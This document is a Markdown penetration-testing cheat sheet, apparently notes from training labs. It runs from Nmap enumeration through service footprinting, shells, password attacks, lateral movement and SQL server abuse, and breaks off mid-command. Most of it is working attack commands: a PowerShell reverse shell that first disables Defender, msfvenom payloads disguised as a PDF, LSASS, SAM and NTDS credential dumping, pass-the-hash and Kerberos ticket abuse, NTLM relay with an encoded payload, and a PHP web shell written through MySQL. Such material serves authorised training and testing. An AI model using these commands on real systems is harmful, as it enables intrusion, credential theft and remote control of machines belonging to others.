# Network Enumeration with Nmap
## Discover Alive Hosts
```
nmap 10.129.2.0/24 -sn -oA alive_hosts | grep for | cut -d" " -f5
```

## Nmap host scans
```
nmap
nmap -sS -p- -A 10.129.2.1 -oA ss_host_scan
nmap -sT -p- -A 10.129.2.1 -oA st_host_scan
nmap -F -sU 10.129.2.1 -oA su_host-scan
```

## Vulnerability Scan
```
nmap 10.129.2.1 -p- -A --script vuln
```

## DNS Proxying
```
nmap -sS -p- -A 10.129.2.1 -oA ss_dns_host_scan --source-port 53
```

# Footprinting
## Infrastructure Enumeration
### Domain Enumeration
#### Certificate Transparency
Check crt.sh
#### Company Hosted Servers 
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
```
#### Shodan Scan
```
for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
for i in $(cat ip-addresses.txt);do shodan host $i;done
```
#### DNS Records
```
dig any inlanefreight.com
```

### Cloud Enumeration
#### Google Search for AWS
```
intext: inurl:amazonaws.com
```
#### Google Search for Azure
```
intext: inurl:blog.core.windows.net
```
#### Website Source Code
View the source code for amazonaws and windows.net

#### Domain.Glass
View the security assessment
#### GrayHatWarfare
Search for leaked data.

### Staff
Check employees linkedin. If we find a github, look through it. 


## Host Based Enumeration
### FTP
#### Check for anonymous login
```
ftp 10.129.14.136
```
#### Basic Enumeration (FTP Session)
```
ls
ls -R
status
debug
trace
get
put
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

#### Nmap Enumeration
```
nmap -sV -p21 -sC -A 10.129.14.136
```

### SMB
#### Enumerate available shares and connect to a share
```
smbclient -N -L //10.129.14.128
smbclient //10.129.14.128/notes
```
#### Interacting with SMB
```
get pred-prod.txt
put doc.txt
smbstatus
```
#### Enumerate with Nmap
```
nmap 10.129.14.128 -sV -sC -p139,445
```
#### Enumerate with RPCclient
```
rpcclient -U "" 10.129.14.128
srvinfo
enumdomains
querydominfo
netshareenumall
netsharegetinfo notes
enumdomusers
queryuser 0x3e9
querygroup0x201
```
#### Bruteforce RIDs
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
#### Samrdump.py
```
samrdump.py 10.129.14.128
```
#### smbmap
```
smbmap -H 10.129.14.128
```
#### CrackMapExec
```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
#### Enum4Linux
```
enum4linux -a 10.10.10.225
```

### NFS
#### Enumerate with Nmap
```
nmap 10.129.14.128 -p111,2049 -sV -sC
nmap --script nfs* 10.129.14.128 -sV -p111,2049
```
#### Show Available NFS Shares
```
showmount -e 10.129.14.128
```
#### Mount an NFS Share
```
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```
#### Listing Contents with Usernames and Group Names
```
ls -l mnt/nfs/
```
#### Listing Contents with UIDs and GUIDs
```
ls -n mnt/nfs/
```
#### Unmounting
```
sudo umount ./target-NFS
```

### DNS
#### DIG
##### DNS SOA Record
```
dig soa www.inlanefreight.com
```
##### DIG - NS Query
```
dig ns inlanefreight.htb @10.129.14.128
```
##### DIG - Version Query
```
dig CH TXT version.bind 10.129.120.85
```
##### DIG - ANY Query
```
dig any inlanefreight.htb @10.129.14.128
```
##### DIG - AXFR Zone Transfer
```
dig axfr inlanefreight.htb @10.129.14.128
```
##### DIG - ACFR Zone Transfer - Internal
```
dig axfr internal.inlanefreight.htb @10.129.14.128
```
#### Subdomain Bruteforcing
##### DIG
```
for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```
##### DNSEnum
```
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

### SMTP
#### Intereact with SMTP with Telnet
```
telnet 10.129.14.128 25
HELO mail1.inlanefreight.htb
EHLO mail1
VRFY root
VRFY cry0l1t3
```
#### Send an Email
```
telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
DATA
From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200
Hey man, I am trying to access our XY-DB but the creds don't work. 
Did you make any changes there?
.
```
#### Footprint the Service with Nmap
```
nmap 10.129.14.128 -sC -sV -p25
nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### IMAP/POP3
#### Footprinting IMAP/POP3 with Nmap
```
nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```
#### Interacting with IMAP/POP3
```
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

### SNMP
#### Brute Force Community Strings
```
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
```
#### SNMPwalk
```
snmpwalk -v2c -c public 10.129.14.128
```
#### Braa
```
braa <community string>@<IP>:.1.3.6.*
```

### MySQL
#### Foorprinting with Nmap
```
nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
#### Interact with MySQL Server
```
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

### MSSQL
#### Enumerate MSSQL with nmap
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```
#### Interacting with MSSQL
```
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### Oracle TNS
#### Enumerate TNS with Nmap
```
nmap -p1521 -sV 10.129.204.235 --open
nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
#### ODAT
```
odat all -s 10.129.204.235
```
#### Interact with TNS
```
sqlplus scott/tiger@10.129.204.235/XE;
```
#### SQLPlus Commands
```
https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985
```

### IPMI
#### Footprinting the Service with nmap
```
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```
#### Metasploit Version Scan
```
use auxiliary/scanner/ipmi/ipmi_version
set rhosts 10.129.42.195
show options
run
```
#### Metasploit Dumping Hashes
```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
show options
run
```

## Remote Management Protocols
### Linux Remote Management Protocols
#### SSH
##### SSH Audit
```
ssh-audit 10.129.14.132
```
##### Change Authentication Method
```
ssh -v cry0l1t3@10.129.14.132
ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
```

#### Rsync
##### Footprint the service with Nmap
```
nmap -sV -p 873 127.0.0.1
```
##### Probing for Accessible Shares
```
nc -nv 127.0.0.1 873
```
##### Enumerate Open Shares
```
rsync -av --list-only rsync://127.0.0.1/dev
```

#### R-Services
##### Footprint the service with Nmap
```
nmap -sV -p 512,513,514 10.0.17.2
```
##### Logging in with Rlogin
```
rlogin 10.0.17.2 -l htb-student
```
##### List Authenticated Users Using Rwho
```
rwho
```
##### List Authenticatesd Users Using Rusers
```
rusers -al 10.0.17.5
```

### Windows Remote Management Protocols
#### RDP
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
```
##### RDP Security Check
```
./rdp-sec-check.pl 10.129.201.248
```
##### Initiate an RDP Session
```
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248 /dynamic-resolution
```

#### WinRM
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```
##### Evil Winrm
```
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

#### WMI
##### Footprinting the Service with Nmap
```
nmap -sV -sC 10.129.201.248 -p135 --disable-arp-ping -n
```
##### WMIexec
```
wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

# Information Gathering - Web Edition
## Passive Information Gathering
### Whois
```
whois facebook.com
```

### DNS
#### nslookup
##### Querying A Records
```
nslookup facebook.com
```
##### Querying A Records for a subdomain
```
nslookup -query=A www.facebook.com
```
##### Querying PTR Records for an IP Address
```
nslookup -query=PTR 31.13.92.36
```
##### Querying ANY Existing Records
```
nslookup -query=ANY facebook.com
```
##### Querying TXT Records
```
nslookup -query=TXT facebook.com
```
##### Querying MX Records
```
nslookup -query=MX facebook.com
```

#### DIG
##### Querying A Records
```
dig facebook.com @1.1.1.1
```
##### Querying A Records for a subdomain
```
dig a www.facebook.com @1.1.1.1
```
##### Querying PTR Records for an IP Address
```
dig -x 31.13.92.36 @1.1.1.1
```
##### Querying ANY Existing Records
```
dig any facebook.com @1.1.1.1
```
##### Querying TXT Records
```
dig txt facebook.com @1.1.1.1
```
##### Querying MX Records
```
dig mx facebook.com @1.1.1.1
```

#### Determine Host
```
nslookup facebook.com
whois 157.240.199.35
```

### Passive Subdomain Enumeration
#### VirusTotal
Check Virustotal Relations
#### Certificates
```
https://cencys.io
https://crt.sh
```
#### TheHarvester
##### Sources.txt
```
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```
##### The Command
```
cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"
```

### Passive Infrastructure Enumeration
#### Netcraft
```
https://sitereport.netcraft.com
```
#### Wayback Machine and Wayback URLs
```
waybackurls -dates https://facebook.com > waybackurls.txt
```

## Active Information Gathering
### Active Infrastructure Indentification
#### HTTP Headers
```
curl -I "http://${TARGET}"
```
#### WhatWeb
```
whatweb -a3 https://www.facebook.com -v
```
#### Use Wappalyzer
Use Browser
#### Use WafW00f
```
wafw00f -v https://www.tesla.com
```
#### Aquatone
```
cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
```

### Active Subdomain Enumeration
#### Zone Transfer
1. Identifying Nameservers
```
nslookup -type=NS zonetransfer.me
```
2. Testing for ANY and AXFR Zone Transfer
```
nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja
```
#### Gobuster
```
gobuster dns -d mydomain.com -w /usr/share/wordlists/dirb/common.txt
```

### Virtual Hosts
#### vHost Fuzzing with FFuF
```
ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
```

### Crawling
#### Use ZAP
#### Use FFuF
```
ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
```

# Vulnerability Assessment

# Shells & Payloads
## Bind Shell
### Netcat
#### Start Netcat Listener on Target Machine
```
nc -lvnp 7777
```
#### Connect to the Target Machine
```
nc -nv 10.129.41.200 7777
```
### Binding a Bash Shell to TCP
#### Start the Listener
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### Connect to the Target
```
nc -nv 10.129.41.200 7777
```

## Reverse Shell
### Netcat
#### Start the Listener on the Attacking Machine
```
nc -lvnp 443
```
#### Connect to the Attacking Machine (Powershell)
```
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```

## Payloads
### MSFVenom
#### List Payloads
```
msfvenom -l payloads
```
#### Building a Stageless Payload Linux
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
#### Building a Stageless Payload Windows
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
#### Start the Listener
```
nc -lvnp 443
```

## Windows Shells

## NIX Shells
### Spawn an Interactive Python TTY Shell
```
python -c 'import pty; pty.spawn("/bin/sh")'
```
### /bin/sh
```
/bin/sh -i
```
### Perl
```
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```
### Ruby
```
ruby: exec "/bin/sh"
```
### lua
```
lua: os.execute('/bin/sh')
```
### awk
```
awk 'BEGIN {system("/bin/sh")}'
```
### find
```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
### Exec
```
find . -exec /bin/sh \; -quit
```
### vim
```
vim -c ':!/bin/sh'
```
### vim escape
```
vim
:set shell=/bin/sh
:shell
```
## Check permissions
```
ls -lah /path/to/binary
sudo -l
```

## Web Shells
### Laudanum
```
cp /usr/share/webshells/laudanum/aspx/shell.aspx 
```
### Antak
```
/usr/share/nishang/Antak-WebShell
```
### PHP Web Shells
```
https://github.com/WhiteWinterWolf/wwwolf-php-webshell
```

# Password Attacks
## Remote Password Attacks
### Network Services
#### CrackMapExec
```
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
```
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```
#### Evil-WinRM
```
evil-winrm -i <target-IP> -u <username> -p <password>
```
```
evil-winrm -i 10.129.42.197 -u user -p password
```
#### Hydra - SSH
```
hydra -L user.list -P password.list ssh://10.129.42.197
```
#### Hydra - RDP
```
hydra -L user.list -P password.list rdp://10.129.42.197
```
#### Hydra - SMB
```
hydra -L user.list -P password.list smb://10.129.42.197
```

### Default Credentials
```
https://github.com/ihebski/DefaultCreds-cheat-sheet
```

## Windows Local Password Attacks
### Attacking SAM
#### Using reg.exe and secretsdump.py
```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.tx
```
#### Using CrackMapExec
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Attacking LSASS
#### Dumping LSASS with Task Manager
Open Task Manager > Right Click Local Security Authority Process > Create Dump File > Navigate to lsass.DMP
```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
#### Dumping LSASS with Powershell
```
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
#### Use Pypykatz to Parse the LSASS Secrets
```
pypykatz lsa minidump /path/to/lsass.dmp 
```
#### Crack NT Hash with HashCat
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### Attacking Active Directory and NTDS.dit
#### From Evil-WinRM
```
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
#### From CrackMapExec
```
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
#### Crack the Hash with Hashcat
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
#### OR Pass the Hash
```
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

### Credential Hunting
#### Lazagne
```
start lazagne.exe all
```
#### Findstr
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.pdf
```

## Linux Local Password Attacks
### Credential Hunting in Linux
#### Find SSH Keys
```
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
#### History
```
cat /home/*/.bash*
```
#### Memory - mimipenguin
```
python3 mimipenguin.py
```
#### Memory - LaZagne
```
python2.7 laZagne.py all
```
#### Browsers - Lazagne
```
python3 laZagne.py browsers
```
#### Browsers Firefox
```
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

### Passwd, SHadow, Opasswd
#### Passwd - Remove root or user password requirement
```
root::0:0:root:/root:/bin/bash
```
#### View Passwd,Shadow,Opasswd
```
cat /etc/passwd
cat /etc/shadow
cat /etc/security/opasswd
```
#### Cracking Linux Credentials
```
cp /etc/passwd /tmp/passwd.bak
cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

## Windows Lateral Movement
### Pass the Hash
#### Enable Restricted Admin Mode to Allow PtH
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
#### Pass the Hash Using Mimikatz
```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
#### Invoke-Thehash with SMB
```
cd C:\path\to\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
#### Start a Netcat Listener
```
nc.exe -lvnp 8001
```
#### RevShells Make a Payload
```
https://www.revshells.com/
```
#### Invoke-TheHash with WMi
```
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "output from revshell"
```
#### Pass the Hash with Impacket
```
psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```
#### Pass the Hash with CrackMapExec
```
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
#### Pass the Hash with Evil-WinRM
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
#### Connect to the Machine with RDP
```
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /dynamic-resolution
```

### Pass the Ticket - Windows
#### Harvest Tickets - Windows
##### Mimikatz - Export Tickets
```
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
##### Mimikatz - Extract Kerberos Keys
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
##### Mimikatz - Pass the Key or OverPass the Hash
```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
##### Mimikatz - Pass the Ticket
```
mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
```
##### Mimikatz Pass the Ticket for Lateral Movement
```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
powershell
Enter-PSSession -ComputerName DC01
```

##### Rubeus - Export Tickets
```
rubeus.exe dump /nowrap
```
##### Ruberus Pass the Key or OverPass the Hash
```
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
##### Rubeus Pass the Ticket
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
##### Convert .kirbi to Base64 and Pass the Ticket
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
Rubeus.exe ptt /ticket:output from preveious command
```
##### Rubeus - Powershell Remoting and Pass the Ticket
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
powershell
Enter-PSSession -ComputerName DC01
```

### Pass the Ticket - Linux
#### Identify Linux and AD Integration
##### Realm
```
realm list
```
##### PS
```
ps -ef | grep -i "winbind\|sssd"
```
#### Find Keytab Files
##### Find
```
find / -name *keytab* -ls 2>/dev/null
```
##### Cronjobs
```
crontab -l
```
##### Review Environment Variable
```
env | grep -i krb5
```
##### Search for Ccashe Files in /tmp
```
ls -la /tmp
```
#### Keytab
##### Abusing KeyTab Files
```
klist -k -t 
```
##### Impersonating a User with a KeyTab
```
klist
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
smbclient //dc01/carlos -k -c ls
```
##### Extracting Keytab Hashes with KeyTabExtract
```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
##### Crack the hash with hashcat or crackstation
```
https://crackstation.net/
```
##### Log in as Carlos
```
su - carlos@inlanefreight.htb
```
##### Look for ccache Files
```
ls -la /tmp
```
##### Identifying Group Membership with id Comamnd
```
id julio@inlanefreight.htb
```
##### Importing the ccache file into our current session
```
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
mbclient //dc01/C$ -k -c ls -no-pass
```

#### Using Linux Attack Tools with Kerberos
##### Modify the Host file to hardcode IP Addresses of the Domain and Machines we want to attack.
```
# Host addresses

172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01
```
##### Proxychains Config File
```

<SNIP>

[ProxyList]
socks5 127.0.0.1 1080
```
##### Doanload Chisel to the Attack Host
```
./chisel server --reverse 
```
##### Execute Chisel from MS01
```
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
##### Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
##### Use impacket eith proxychains and kerberos authentication
```
proxychains impacket-wmiexec dc01 -k
```
##### Kerberos Configuration of /etc/krb5.conf
```

[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>
```
##### Use Evil-WinRM with Kerberos
```
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

#### Miscellaneous
##### Impacket Ticket Converter
```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
##### Importing Converted Ticket into Windows Session with Rubeus
```
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

#### Linikatz
Run it get all the hashes.

## Cracking Files
### Protected Files
### Hunting for Files
```
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
### SSH
#### Hunting for SSH Keys
```
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```
#### Encryoted SSH Key
```
cat /home/cry0l1t3/.ssh/SSH.private
```
#### Cracking SSH with John
```
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```
#### Cracking Documents with John
```
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```
#### Cracking PDFs with John
```
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```

### Protected Archives
#### Cracking ZIp with John
```
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
```
#### Cracking OpenSSL Encrypted Archives
```
file GZIP.gzip
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
#### Cracking BitLocker Encrypted Drives
```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
```


# Attacking Common Services
## FTP
### Enumerate FTP with nmap
```
sudo nmap -sC -sV -p 21 192.168.2.142 
```
### Check for Anonymous Access
```
ftp 192.168.2.142
```
### Brute Forcing with Medusa
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```
### FTP BounceBack Attack
```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## SMB
### Enumerate SMB with nmap
```
nmap 10.129.14.128 -sV -sC -p139,445
```
### Check for Null Session
```
smbclient -N -L //10.129.14.128
```
### SMBMap
#### Check for File Shares
```
smbmap -H 10.129.14.128
```
#### Browse a Directory Recursively with smbmap
```
smbmap -H 10.129.14.128 -r notes
```
#### Download a File with smbmap
```
smbmap -H 10.129.14.128 --download "notes\note.txt"
```
#### Upload a File with smbmap
```
smbmap -H 10.129.14.128 --upload test.txt "notes\note.txt"
```
### Remote Procedure Call (RPC)
#### Check for Null Session
```
rpcclient -U'%' 10.10.110.17
```
#### Enumeration with RPC
```
enumdomusers
```
### Enum4linux
```
enum4linux 10.10.11.45 -A -C
```
### Password Spray with CME
```
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
### RCE with PSExec
```
psexec administrator:'Password123!'@10.10.110.17
```
### RCE with CME
```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
### RCE Enumeration
```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
### Pass the Hash with CME
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
### Capture Hashes with Responder
```
responder -I ens33
```
### Crack hashes with Hashcat
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
### NTLMRelayx
#### Edit responder.conf
```
SMB = Off
```
#### Run ntlmrelayx
```
ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 
ntlmrelayx --no-http-server -smb2support -t 10.10.110.146 -c 'powershell -e base64 from revshells.com'
nc -nvlp 9001
```

## SQL Databases
### Banner Grab with Nmap
```
nmap -Pn -sV -sC -p1433 10.10.10.125
```
### MySQL Basics
#### Connect to a MySQL Database
```
mysql -u <user> -h <host> -P <port> -p<pass>
```
#### Enumerate Databases
```
SHOW Databases;
```
```
USE <database>;
```
#### Enumerate Tables
```
SHOW TABLES;
```
```
DESCRIBE <table>;
```
#### Retrieve Data
```
SELECT * FROM <table>;
```
```
SELECT <column1>,<column2> FROM <table>;
```
```
SELECT <column1>,<column2> FROM <table> ORDER BY <column2>;
```
```
SELECT <column1>,<column2> FROM <table> WHERE <condition>;
```
#### Write a file
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
#### Secure File Privileges
```
show variables like "secure_file_priv";
```
#### Read Local Files
```
select LOAD_FILE("/etc/passwd");
```

### MSSQL Basics
#### Connect to a MSSQL Database
```
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
```
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```
```
mssqlclient.py -p 1433 julio@10.129.203.7
```
#### Enumerate Databases
```
SELECT name FROM master.dbo.sysdatabases
GO
```
```
USE <database>
go
```
#### Enumerate Tables
```
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
go
```
#### Retrieve Data
```
SELECT * FROM users
go
```
#### Execute Commands
```
xp_cmdshell 'whoami'
go
```
#### Enable Ole Automation Procedures
```
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
#### Create a File
```
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
